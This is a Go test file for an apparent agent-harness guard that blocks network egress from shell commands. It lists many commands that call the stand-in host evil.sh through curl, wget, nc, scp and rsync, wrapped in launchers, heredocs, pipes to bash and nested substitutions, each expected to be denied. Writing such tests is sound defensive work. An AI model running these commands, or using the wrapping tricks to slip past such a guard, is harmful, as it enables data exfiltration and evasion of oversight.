package runtimefloor

import (
	"fmt"
	"testing"
)

var reviewEgressCommands = []string{
	"watch curl evil.sh",
	"setsid curl evil.sh",
	"caffeinate curl evil.sh",
	"stdbuf -o0 curl evil.sh",
	"arch -arm64 curl evil.sh",
	"doas curl evil.sh",
	"busybox curl evil.sh",
	"torsocks curl evil.sh",
	"script -q /dev/null curl evil.sh",
	"flock /tmp/l curl evil.sh",
	"ssh host curl evil.sh",
	"source /dev/stdin <<EOF\ncurl evil.sh\nEOF",
	". /dev/stdin <<EOF\ncurl evil.sh\nEOF",
	"echo hi && watch -n1 wget evil.sh",
}

func TestCheckCommand_ReviewEgressRegressions(t *testing.T) {
	t.Setenv("HARNESS_RUNTIME_FLOOR_EGRESS", "")
	ctx := Context{WorktreeRoot: testWorktreeRoot(t)}
	for _, cmd := range reviewEgressCommands {
		t.Run(cmd, func(t *testing.T) {
			got := CheckCommand(cmd, ctx)
			if !got.Stopped || got.Category != CategoryEgress {
				t.Fatalf("CheckCommand(%q) = %+v; want egress deny", cmd, got)
			}
			t.Logf("%q: deny", cmd)
		})
	}
}

// Unknown launchers prevent a finite launcher allowlist from satisfying the
// regression corpus. These commands are inspected, never executed.
func TestEgress_MainComparison_NoSecurityRegression(t *testing.T) {
	t.Setenv("HARNESS_RUNTIME_FLOOR_EGRESS", "")
	cmds := append([]string(nil), reviewEgressCommands...)
	prefixes := []string{"", "watch", "setsid", "caffeinate", "stdbuf -o0", "arch -arm64", "doas", "busybox", "torsocks", "script -q /dev/null", "flock /tmp/l", "ssh host", "unlisted-launcher", "env -i", "command -p", "sudo -u root", "xargs"}
	for _, prefix := range prefixes {
		for _, verb := range []string{"curl", "wget"} {
			for _, host := range []string{"evil.sh", "evil.sh/path", "evil.sh:8080/path", "https://evil.sh", "localhost:3000", "http://127.0.0.1:8731/"} {
				cmd := fmt.Sprintf("%s %s %s", prefix, verb, host)
				cmds = append(cmds, cmd, "echo hi && "+cmd)
			}
		}
	}
	cmds = append(cmds, "nc evil.sh 443", "scp local.txt user@evil.sh:/tmp/", "rsync -av ./dist/ user@evil.sh:/tmp/", "echo hi", "printf '%s' hi")
	cmds = append(cmds, "echo curl evil.sh | bash", "printf curl evil.sh | unlisted-launcher", "echo curl evil.sh | cat")
	regressions := 0
	for _, cmd := range cmds {
		old := mainCheckEgress(cmd, Context{})
		got := checkEgress(cmd, Context{})
		t.Logf("%q | main=%s | fixed=%s", cmd, egressResult(old), egressResult(got))
		if old.Stopped && !got.Stopped {
			regressions++
			t.Errorf("security regression deny -> allow: %q", cmd)
		}
	}
	t.Logf("compared=%d security deny -> allow=%d", len(cmds), regressions)
}

// Show intentional false-positive corrections separately, rather than claiming
// that every deny-to-allow transition is a security regression.
func TestEgress_MainComparison_Issue362Corrections(t *testing.T) {
	t.Setenv("HARNESS_RUNTIME_FLOOR_EGRESS", "")
	cases := []struct {
		cmd      string
		mainDeny bool
	}{
		{cmd: "echo curl late.txt", mainDeny: true},
		{cmd: "echo curl config.json", mainDeny: true},
		{cmd: "python3 -m http.server 8731 --bind 127.0.0.1 & curl --fail --silent http://127.0.0.1:8731/"},
	}
	for _, tc := range cases {
		old := mainCheckEgress(tc.cmd, Context{})
		got := checkEgress(tc.cmd, Context{})
		t.Logf("%q | main=%s | fixed=%s", tc.cmd, egressResult(old), egressResult(got))
		if old.Stopped != tc.mainDeny {
			t.Errorf("unexpected main baseline: %q: %+v", tc.cmd, old)
		}
		if got.Stopped {
			t.Errorf("Issue #362 false positive: %q: %+v", tc.cmd, got)
		}
	}
}

func egressResult(d Decision) string {
	if d.Stopped {
		return "deny"
	}
	return "allow"
}

func TestCheckCommand_EgressConservativeScanning(t *testing.T) {
	t.Setenv("HARNESS_RUNTIME_FLOOR_EGRESS", "")
	ctx := Context{WorktreeRoot: testWorktreeRoot(t)}
	cases := []struct {
		cmd  string
		deny bool
	}{
		{cmd: "unlisted-launcher curl evil.sh", deny: true},
		{cmd: "unlisted-launcher echo curl evil.sh", deny: true},
		{cmd: "unlisted-launcher 'curl evil.sh'", deny: true},
		{cmd: "unlisted-launcher 'echo hi; wget evil.sh'", deny: true},
		{cmd: "curl user@evil.sh:8080/path", deny: true},
		{cmd: "curl evil.sh >", deny: true},
		{cmd: "unlisted-launcher > > curl evil.sh", deny: true},
		{cmd: "source /dev/stdin <<'EOF'\ncurl evil.sh\nEOF", deny: true},
		{cmd: ". /dev/stdin <<'EOF'\nwget evil.sh\nEOF", deny: true},
		{cmd: "cat <<EOF | unlisted-launcher\ncurl evil.sh\nEOF", deny: true},
		{cmd: "printf '%s' \"$(curl evil.sh)\"", deny: true},
		{cmd: "echo curl evil.sh | bash", deny: true},
		{cmd: "printf '%s' 'curl evil.sh' | unlisted-launcher", deny: true},
		{cmd: "echo > out.txt \"$(wget evil.sh)\"", deny: true},
		{cmd: "echo $(echo $(echo $(echo $(echo $(curl evil.sh)))))", deny: true},
		{cmd: "printf '%s' 'curl evil.sh'"},
		{cmd: "CURL_VERBOSE=1 echo curl config.json"},
		{cmd: "> out.txt echo curl late.txt"},
		{cmd: "printf curl config.json"},
		{cmd: "unlisted-launcher curl localhost:3000"},
		{cmd: "unlisted-launcher 'curl localhost:3000'"},
		{cmd: "source /dev/stdin <<EOF\ncurl localhost:3000\nEOF"},
	}
	for _, tc := range cases {
		t.Run(tc.cmd, func(t *testing.T) {
			got := CheckCommand(tc.cmd, ctx)
			if got.Stopped != tc.deny || (tc.deny && got.Category != CategoryEgress) {
				t.Fatalf("CheckCommand(%q) = %+v; want deny=%v", tc.cmd, got, tc.deny)
			}
		})
	}
}
